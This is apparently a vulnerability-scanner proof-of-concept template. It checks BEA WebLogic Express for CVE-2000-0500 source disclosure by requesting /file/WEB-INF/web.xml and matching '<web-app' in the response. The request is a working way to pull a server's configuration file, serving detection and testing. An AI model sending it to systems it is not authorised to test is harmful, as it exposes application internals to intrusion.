[info]
author = "ave"
description = "检测 BEA WebLogic Express 默认配置下的源代码泄露漏洞，通过向 /file/WEB-INF/web.xml 发送 GET 请求验证服务器是否直接返回文件源代码而非执行结果"
id = "POC-AVE-2000-0419"
name = "BEA WebLogic Express Source Code Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0419"]
vuln_id = [
    "CVE-2000-0500",
    "AVE-2000-0419",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/file/WEB-INF/web.xml"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<web-app"]
